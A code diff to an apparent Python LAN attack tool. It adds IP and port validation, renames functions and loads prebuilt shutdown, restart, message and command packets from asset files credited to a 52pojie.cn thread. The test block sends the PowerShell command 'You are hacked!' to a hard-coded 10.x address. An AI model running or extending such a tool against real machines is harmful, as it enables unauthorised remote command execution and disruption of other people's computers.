@@ -1,7 +1,8 @@
-# todo:
+# todo: edit the type hint to adapt lower Python versions.
 
 import logging
 import os
+import re
 import socket
 import sys
 import time
@@ -56,7 +57,7 @@ def _resource_dir(relative_dir: str) -> str:
     return os.path.join(base_dir, relative_dir)
 
 
-def read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str, windowed_dir: str) -> None:
+def _read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str, windowed_dir: str) -> None:
     """
     从资源文件读取预构造的数据包。注意：传入的路径应该是已经被 _resource_dir 函数处理过的，本函数不会处理路径。
     :param shutdown_dir: 关机数据包路径
@@ -78,6 +79,16 @@ def read_payload(shutdown_dir: str, restart_dir: str, msg_dir: str, cmd_dir: str
     logger.info(f"Read payload from: {shutdown_dir}, {restart_dir}, {msg_dir}, {cmd_dir}, {windowed_dir}")
 
 
+def _validate_ip(ip: str):
+    ipv4 = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
+    ipv6 = re.compile(r'^(([0-9a-fA-F]{1,4}):){7}([0-9a-fA-F]{1,4})$')
+    return (ipv4.match(ip) is not None) or (ipv6.match(ip) is not None)
+
+
+def _validate_port(port: int):
+    return 0 <= port <= 65535
+
+
 class Target:
     """
     要发送数据的目标主机。
@@ -95,6 +106,10 @@ class Target:
         初始化 Target 对象时传入的参数。
         :param address: 包含 IP 地址和端口的元组
         """
+        if not _validate_ip(address[0]):
+            raise ValueError("Invalid IP address")
+        if not _validate_port(address[1]):
+            raise ValueError("Invalid port")
         self.address = address
 
     @staticmethod
@@ -230,7 +245,7 @@ class Target:
         logger.info(f"POWERSHELL: {command} {args} -> {self.address[0]}:{self.address[1]}")
 
 
-def get_localhost() -> str:
+def get_local_lan_ip() -> str:
     """
     获取本地主机的局域网 IP 地址。
     :return: 本地局域网 IP 地址
@@ -249,10 +264,10 @@ CMD_DIR = _resource_dir(".\\assets\\cmd.bin")
 # from 52pojie.cn (https://www.52pojie.cn/thread-1692806-1-1.html)
 WINDOWED_DIR = _resource_dir(".\\assets\\windowed.bin")
 
-read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR, WINDOWED_DIR)
+_read_payload(SHUTDOWN_DIR, RESTART_DIR, MSG_DIR, CMD_DIR, WINDOWED_DIR)
 
 if __name__ == '__main__':
-    print("Your IP: ", get_localhost())
+    print("Your IP: ", get_local_lan_ip())
     ADDR = ("10.165.43.52", 4705)  # edit this test ip before
     send = Target(ADDR)
     send.powershell("Write-Output You are hacked!", "-NoExit")
